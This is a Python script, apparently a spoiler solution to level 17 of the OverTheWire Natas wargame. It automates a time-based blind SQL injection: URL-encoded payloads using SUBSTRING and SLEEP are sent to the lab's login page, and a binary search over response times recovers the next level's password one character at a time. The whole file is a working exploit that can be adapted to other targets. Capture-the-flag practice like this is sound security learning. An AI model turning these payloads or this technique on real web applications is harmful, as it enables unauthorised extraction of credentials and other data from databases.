#!/usr/bin/python3
"""

ALERT
please watch out this has spoilers if youre playing overthewire.org's natas
wargame and have interest in solving level 17 on your own.

Author: penal

"""

# please keep in mind that this script requires a decent reliable internet
# Connection to work

import requests as req
from urllib import parse

host = 'http://natas17.natas.labs.overthewire.org/index.php?username=natas18'
with open('pass') as pwfile:
    try:
        pw = pwfile.readline()[:-1]
    except Exception as e:
        raise e

print('starting...')

# num of seconds to sleep, id recommend leaving this here if your connection isnt
# blazingly fast
SLEEP = 1

session = req.Session()
session.auth = ('natas17', pw)
auth = session.post(host)

def get_elapsed_time(host: str, position: int, letter:str, sign: str = '>', upper: bool = False):
    # this is some very blind sql injection going on here
    # cant see a thing
    if upper:
        if sign!='=':
            print("warning, you're using get_elapsed_time with upper set to true and sign not set to =, it will automatically be set to =.")
        p = parse.\
        quote_plus(f'''" AND BINARY SUBSTRING((SELECT password FROM users WHERE username = 'natas18'), {str(position)}, 1) = BINARY UPPER('{letter}') AND SLEEP({SLEEP}); -- -''')
    else:
        p = parse.\
        quote_plus(f'''" AND SUBSTRING((SELECT password FROM users WHERE username = 'natas18'), {str(position)}, 1) {sign}'{letter}' AND SLEEP({SLEEP}); -- -''')
    r = session.get(host+p)
    time = r.elapsed.total_seconds()
    # body = r.text
    
    return time


def query_eval(time: str):
    return True if time > SLEEP else False


# this function has a very very descriptive name, i dont think it needs any
# more description, but ill do it anyway: it searches for password chars. there
# ya go
def a_dichotomic_search_for_a_lost_password_character(host: str, position: int, low_end: int, high_end: int):
    if abs(high_end - low_end) <= 1:
        if query_eval(get_elapsed_time(host, position, chr(high_end), '=')):
            if (query_eval(get_elapsed_time(host, position, chr(high_end), '=', upper=True))):
                print (f"found position = {position} letter = {chr(high_end).upper()}")
                return chr(high_end).upper()
            else:
                print (f"found position = {position} letter = {chr(high_end)}")
                return chr(high_end)
        elif query_eval(get_elapsed_time(host, position, chr(low_end), '=')):
            if query_eval(get_elapsed_time(host, position, chr(low_end), '=', upper=True)):
                print (f"found position = {position} letter = {chr(low_end).upper()}")
                return chr(low_end).upper()
            else:
                print (f"found position = {position} letter = {chr(low_end)}")
                return chr(low_end)
        else:
            for i in range(10):
                if (query_eval(get_elapsed_time(host, position, str(i), '='))):
                    print(f"found position = {position} number = {str(i)}")
                    return str(i)
            print("something is wrong... i can feel it")
            
    letter = chr((low_end + high_end) // 2)
    time = get_elapsed_time(host, position, letter)
    if query_eval(time):
        # sorry for the mumbo jumbo ord reverse thing but it just stands for chr^-1(letter) :)
        # whats faster a calculation or a function call
        # probably a calculation but whatever
        return a_dichotomic_search_for_a_lost_password_character(host, position, ord(letter), high_end)
    else:
        return a_dichotomic_search_for_a_lost_password_character(host, position, low_end, ord(letter))
        

password = ''
for position in range(1, 33):
    result = a_dichotomic_search_for_a_lost_password_character(host, position, ord('a'), ord('z'))
    password += result
    print(password)

print("password is: "+password)

# hope this wasnt a bit of an overdo. fun is the name of the game
